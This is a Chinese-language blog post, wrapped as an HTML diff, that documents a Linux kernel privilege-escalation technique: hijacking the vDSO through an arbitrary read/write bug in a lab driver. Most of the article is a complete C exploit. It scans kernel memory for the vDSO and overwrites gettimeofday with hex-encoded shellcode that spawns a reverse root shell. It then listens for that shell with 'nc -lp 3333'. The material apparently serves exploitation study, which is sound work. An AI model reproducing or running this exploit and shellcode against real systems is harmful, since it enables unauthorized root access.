@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="hijack_vdso篇 vdso: 内核实现的一个动态库，存在于内核，然后映射到用户态空间，可由用户态直接调用  内核中的vdso如果被修改，那么用户态空间的vdso也会同步被修改   攻击流程  (内核任意代码执行漏洞)内核调用set_memory_rw 函数修改内核vdso页面属性，使得用户态可以直接修改vdso，劫持vdso为shellcode，触发条件同1 (内核任意读写漏洞)内核修改内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux内核提权总结----任意读写(2)">
+<meta property="og:url" content="http://example.com/2021/01/21/kernel_rw2/index.html">
+<meta property="og:site_name" content="Foxllb的个人空间">
+<meta property="og:description" content="hijack_vdso篇 vdso: 内核实现的一个动态库，存在于内核，然后映射到用户态空间，可由用户态直接调用  内核中的vdso如果被修改，那么用户态空间的vdso也会同步被修改   攻击流程  (内核任意代码执行漏洞)内核调用set_memory_rw 函数修改内核vdso页面属性，使得用户态可以直接修改vdso，劫持vdso为shellcode，触发条件同1 (内核任意读写漏洞)内核修改内">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-21T10:31:33.000Z">
+<meta property="article:modified_time" content="2021-04-26T06:37:38.649Z">
+<meta property="article:author" content="foxllb">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/01/21/kernel_rw2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux内核提权总结----任意读写(2) | Foxllb的个人空间</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Foxllb的个人空间</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/21/kernel_rw2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="foxllb">
+      <meta itemprop="description" content="记录foxllb的安全学习历程">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Foxllb的个人空间">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux内核提权总结----任意读写(2)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-21 18:31:33" itemprop="dateCreated datePublished" datetime="2021-01-21T18:31:33+08:00">2021-01-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 14:37:38" itemprop="dateModified" datetime="2021-04-26T14:37:38+08:00">2021-04-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="hijack-vdso篇"><a href="#hijack-vdso篇" class="headerlink" title="hijack_vdso篇"></a>hijack_vdso篇</h2><ul>
+<li><p>vdso: 内核实现的一个动态库，存在于内核，然后映射到用户态空间，可由用户态直接调用</p>
+<ul>
+<li>内核中的vdso如果被修改，那么用户态空间的vdso也会同步被修改</li>
+</ul>
+</li>
+<li><p>攻击流程</p>
+<ol>
+<li>(内核任意代码执行漏洞)内核调用set_memory_rw 函数修改内核vdso页面属性，使得用户态可以直接修改vdso，劫持vdso为shellcode，触发条件同1</li>
+<li>(内核任意读写漏洞)内核修改内核vdso数据，写入shellcode，使得用户态vdso中函数被劫持，当高权限进程调用vdso中特定函数时，触发shellcode，本篇只讲解攻击流程2</li>
+</ol>
+</li>
+</ul>
+<h3 id="一-利用步骤"><a href="#一-利用步骤" class="headerlink" title="一. 利用步骤"></a>一. 利用步骤</h3><h4 id="1-定位内核态vdso位置"><a href="#1-定位内核态vdso位置" class="headerlink" title="1. 定位内核态vdso位置"></a>1. 定位内核态vdso位置</h4><ul>
+<li><p>vdso中存在一些比较有特点的字符串，比如”gettimeofday”，在拥有任意读漏洞的前提下，从0xffffffff80000000(开启kaslr后内核基地址在此地址基础上往上偏移)开始按页搜索内存</p>
+</li>
+<li><p>如果内存其他地方存在”gettimeofday”字符串，且出现在vdso之前，则会返回错误地址。所以在内存搜索时，应以返回地址为起始，使用gdb dump 0x2000 内存，使用ida查看是否是vdso，如果不是，可以忽略这个错误地址，继续向下搜索。</p>
+</li>
+<li><p>得到真正的vdso后，查看”gettimeofday”与vdso起始地址的偏移，后续匹配vdso时，加上这个偏移条件</p>
+</li>
+</ul>
+<h4 id="2-向内核中vdso写入shellcode"><a href="#2-向内核中vdso写入shellcode" class="headerlink" title="2. 向内核中vdso写入shellcode"></a>2. 向内核中vdso写入shellcode</h4><ul>
+<li><p>shellcode功能: 判断进程是否具有root权限，如果成立，则开辟新进程用来反弹root shell</p>
+</li>
+<li><p>shellcode写入位置: 定位vdso上某函数，比如gettimeofday函数，使用shellcode覆盖</p>
+</li>
+<li><p>shellcode触发条件: 当高权限进程调用gettimeofday函数时，自动执行shellcode 反弹root shell</p>
+</li>
+</ul>
+<h3 id="二-驱动代码-见cred篇"><a href="#二-驱动代码-见cred篇" class="headerlink" title="二. 驱动代码(见cred篇)"></a>二. 驱动代码(见cred篇)</h3><h3 id="三-exp"><a href="#三-exp" class="headerlink" title="三. exp"></a>三. exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANGE_POINT 0x100000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RW_READ 0x100001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RW_WRITE 0x100002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_MEM 0X100003</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vunl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *point;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125; VUNL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] =  <span class="string">&quot;\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7&quot;</span></span><br><span class="line">                    <span class="string">&quot;\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F&quot;</span></span><br><span class="line">                    <span class="string">&quot;\x05\x48\x31\xC0\xB0\xE7\x0F\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">leak_data</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *res = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    VUNL.size = <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>; addr &lt; <span class="number">0xffffffffffffffff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        VUNL.point = (<span class="keyword">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">        ioctl(fd, CHANGE_POINT, &amp;VUNL); <span class="comment">//change the point</span></span><br><span class="line">        ioctl(fd, RW_READ, buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;addr is: %p, context is: 0x%lx\n&quot;</span>, VUNL.point, *(<span class="keyword">size_t</span> *)buf);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + <span class="number">0x2b5</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            res = (<span class="keyword">char</span> *)addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] not found, try again!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vdso_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">    addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] can not get VDSO addr\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] usr::VDSO addr is: 0x%lx\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/rw_any_dev&quot;</span>, O_RDWR);</span><br><span class="line">    VUNL.point = (<span class="keyword">char</span> *)leak_data(fd, buf);</span><br><span class="line">    VUNL.size = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">    VUNL.point = VUNL.point + <span class="number">0xb00</span>;</span><br><span class="line">    ioctl(fd, CHANGE_POINT, &amp;VUNL);</span><br><span class="line">    ioctl(fd, RW_WRITE, shellcode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hook in %p\n&quot;</span>, VUNL.point);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (check_vdso_shellcode())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] the shellcode has hook in VDSO&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;nc -lp 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/11/kernel_rw1/" rel="prev" title="Linux内核提权总结----任意读写(1)">
+      <i class="fa fa-chevron-left"></i> Linux内核提权总结----任意读写(1)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/30/kernel_rw3/" rel="next" title="Linux内核提权总结----任意读写(3)">
+      Linux内核提权总结----任意读写(3) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hijack-vdso%E7%AF%87"><span class="nav-number">1.</span> <span class="nav-text">hijack_vdso篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.</span> <span class="nav-text">一. 利用步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AE%9A%E4%BD%8D%E5%86%85%E6%A0%B8%E6%80%81vdso%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 定位内核态vdso位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%90%91%E5%86%85%E6%A0%B8%E4%B8%ADvdso%E5%86%99%E5%85%A5shellcode"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 向内核中vdso写入shellcode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E9%A9%B1%E5%8A%A8%E4%BB%A3%E7%A0%81-%E8%A7%81cred%E7%AF%87"><span class="nav-number">1.2.</span> <span class="nav-text">二. 驱动代码(见cred篇)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89-exp"><span class="nav-number">1.3.</span> <span class="nav-text">三. exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">foxllb</p>
+  <div class="site-description" itemprop="description">记录foxllb的安全学习历程</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">foxllb</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
